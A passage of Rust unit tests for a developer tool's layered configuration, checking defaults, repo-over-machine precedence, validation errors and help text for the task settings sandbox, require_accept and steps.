    assert_eq!(settings(&Worktree::default(), &machine("[task]\nsandbox = false\n")).sandbox, Setting { value: false, layer: Layer::Machine });
    assert_eq!(settings(&repo("[task]\nsandbox = true\n"), &machine("[task]\nsandbox = false\n")).sandbox, Setting { value: true, layer: Layer::Repo });
    assert!(parse_repo("[task]\nsandbox = \"off\"\n", "app.toml").unwrap_err().contains("task.sandbox: must be true or false"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("task.sandbox = true  (default)\n  Whether a task's and the reviewer's shell commands run in Claude Code's sandbox"), "{shown}");
}

#[test]
fn accepting_every_commit_is_off_until_turned_on_and_a_repo_wins_over_the_machine() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).require_accept, Setting { value: false, layer: Layer::Default });
    assert_eq!(settings(&Worktree::default(), &machine("[task]\nrequire_accept = true\n")).require_accept, Setting { value: true, layer: Layer::Machine });
    assert_eq!(settings(&repo("[task]\nrequire_accept = true\n"), &Machine::default()).require_accept, Setting { value: true, layer: Layer::Repo });
    assert_eq!(settings(&repo("[task]\nrequire_accept = false\n"), &machine("[task]\nrequire_accept = true\n")).require_accept, Setting { value: false, layer: Layer::Repo });
    assert!(parse_repo("[task]\nrequire_accept = \"yes\"\n", "app.toml").unwrap_err().contains("task.require_accept: must be true or false"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("task.require_accept = false  (default)\n  Whether every commit must be accepted before it can be pushed") && shown.contains("with it off this has no effect"), "{shown}");
}

#[test]
fn steps_are_on_until_turned_off_and_a_repo_wins_over_the_machine() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).steps, Setting { value: true, layer: Layer::Default });
    assert_eq!(settings(&Worktree::default(), &machine("[task]\nsteps = false\n")).steps, Setting { value: false, layer: Layer::Machine });
    assert_eq!(settings(&repo("[task]\nsteps = false\n"), &Machine::default()).steps, Setting { value: false, layer: Layer::Repo });
    assert_eq!(settings(&repo("[task]\nsteps = true\n"), &machine("[task]\nsteps = false\n")).steps, Setting { value: true, layer: Layer::Repo });
    assert!(parse_repo("[task]\nsteps = \"yes\"\n", "app.toml").unwrap_err().contains("task.steps: must be true or false"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("task.steps = true  (default)\n  Tasks work in steps, one commit each, listed with kebbie steps"), "{shown}");
}
